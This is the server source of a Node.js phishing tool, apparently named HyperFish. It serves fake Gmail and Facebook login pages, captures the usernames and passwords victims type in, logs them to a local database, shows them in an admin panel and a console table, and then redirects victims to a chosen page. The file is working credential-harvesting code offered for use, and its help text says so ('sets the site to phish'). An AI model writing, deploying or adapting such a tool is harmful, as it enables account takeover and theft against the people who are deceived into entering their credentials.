var express = require('express');
var keypress = require('keypress');
var app = express();
var admin_app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var colors = require('colors/safe');
const args = require('yargs').argv;
var Table = require('cli-table');
fs = require('fs');
var port = args.port
var type = args.kind
var Nedb = require('nedb')
var webUi = "False";
var endDestination 
var art1 = `
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝██║  ██║
███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╗  ██║███████╗███████║
██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══╝  ██║╚════██║██╔══██║
██║  ██║   ██║   ██║     ███████╗██║  ██║██║     ██║███████║██║  ██║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝`
var art2 = `
_                           ______ _     _     
| |                         |  ____(_)   | |    
| |__  _   _ _ __   ___ _ __| |__   _ ___| |__  
| '_ \| | | | '_ \ / _ \ '__|  __| | / __| '_ \ 
| | | | |_| | |_) |  __/ |  | |    | \__ \ | | |
|_| |_|\__, | .__/ \___|_|  |_|    |_|___/_| |_|
        __/ | |                                 
       |___/|_|                             
`

var sites = [
  'Gmail',
  'Facebook'

]

var MOTD = [
  'Somethings Fishy',
  'get smooked',
  'Nothing to see here move along',
  'Just conducting an \"Experiment\"',
  'NEMESYS43 WUZ HERE'
]

var options = require( "yargs" )  
.usage( "\nUsage: $0  [--kind=Gmail]" )
.command( "--port=", "--kind=")
.required( 'kind')

.option( "kind", { describe: "sets the site to phish", type: "string" } )
.option( "destination", { describe: "sets the site your victim lands \non when they submit their data"} )
.option( "port", { describe: "sets the port to use default is 80", type: "string" } )
.option( "webui", { describe: "sets if you want to run the web UI",} )
.help( "?" )
.alias( "?", "help" )
.example( "$0 --port=8080 --kind=Gmail" , "Opens a fake Gmail login page on port 8080" )
.epilog( "Copyright 2018 NEMESYS43" )
.argv;

if(!options.destination){
  endDestination = "http://localhost"
}else{
  endDestination = args.destination
}

if(!options.port){
  port = '80'
}
if(args.webui){
  webUi= "True"
}


  var selectedMOTD = MOTD[Math.floor(Math.random() * 5)];


app.get('/', function(req, res){
  app.use(express.static(__dirname + '/' + type));
  res.sendFile(__dirname + '/'+ type +'/index.html')
});
app.get('/adminPanel', function(req, res){
  if (webUi == "True"){
  app.use(express.static(__dirname + '/adminpanel'));
  res.sendFile(__dirname + '/adminpanel/index.html')
  }else{
    app.use(express.static(__dirname + '/' + type));
    res.sendFile(__dirname + '/'+ type +'/404.html')
  }
});
    
    io.on('connection', function(socket){

           var address = socket.handshake.address;
           console.log(colors.green('[+]') + colors.white(' A user connected from' + address));
           socket.on('UsernameEmail',function(email, from){
           console.log(colors.green('[+]') + colors.white('Captured Email -> ')+ colors.blue(email) +  'from ' + from);
           storedEmail = email

        })

        socket.on('Password',function(password, from){

          console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password) + ' from ' + from);
          gmail.insert({from: from, gmail: storedEmail, password: password }, function (err) {});
          socket.emit('newData')
          socket.emit('sendToEnd',endDestination)

        })

        socket.on('allCreds',function(from,email,password){

          console.log(colors.green('[+]') + colors.white('Captured Credentials -> ')+ colors.blue('Username :' + email + ' Password : ' + password) + ' from ' + from);
          gmail.insert({from: from, gmail: email, password: password }, function (err) {});
          socket.emit('sendToEnd',endDestination)

        })

        socket.on('queryCredentials', function(){

          gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
            docs.forEach(function(d){
              socket.emit('queriedCredentials',d.from, d.gmail, d.password)
            });  

          });

        })

      });


  app.set('port', process.env.PORT || 3000);
  http.listen(port, function(){
    console.log(colors.green('[+]') + colors.white(' listening on *:'+ port));
  });
  console.log(colors.blue.bold(art1) + colors.cyan('   by NEMESYS43'))
  console.log(colors.yellow.bold('                       ' + selectedMOTD));
  console.log('\n\n\n')
  gmail = new Nedb({ filename: 'db/gmail.db', autoload: true });
  webUser = new Nedb({ filename: 'db/webUser.db', autoload: true });
  if (sites.indexOf(type) >= 0) {
    console.log(colors.green('[+]') + colors.white(' Found Site '+ type));
    keypress(process.stdin);

   process.stdin.on('keypress', function (ch, key) {
     if (key.name == 'l') {
       showLog()
     }else if(key && key.ctrl && key.name == 'c'){
       process.exit();
     }
   });  

   process.stdin.setRawMode(true);
   process.stdin.resume();

  }else{
    console.log(colors.red('[!]') + colors.white(' Failed to find Site '+ type));
    console.log(colors.red('[!]') + colors.white(' Quiting'));
    process.exit()
  }

function showLog(){
  console.log(colors.green('[+]') + colors.white(' Showing Logs'));

  var table = new Table({head: ['From','Username', 'Password'], colWidths: [35, 35,35]});

    gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
      docs.forEach(function(d) {table.push([d.from,d.gmail, d.password]);  
    });
    console.log(table.toString());
});
}

